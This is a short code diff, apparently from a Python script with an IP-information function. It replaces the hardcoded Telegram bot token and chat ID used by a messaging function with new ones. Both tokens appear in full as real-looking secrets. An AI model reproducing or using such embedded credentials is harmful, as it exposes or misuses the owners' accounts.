@@ -95,10 +95,10 @@ def get_ip_info(ip_address):
 
 def TeleBot(message):
     # Replace 'YOUR_API_TOKEN' with your actual bot token
-    bot = Bot(token='7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ')
+    bot = Bot(token='7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I')
 
     # Replace 'CHAT_ID' with the chat ID where you want to send the message
-    chat_id = '5813084500'
+    chat_id = '1428483523'
 
     
 
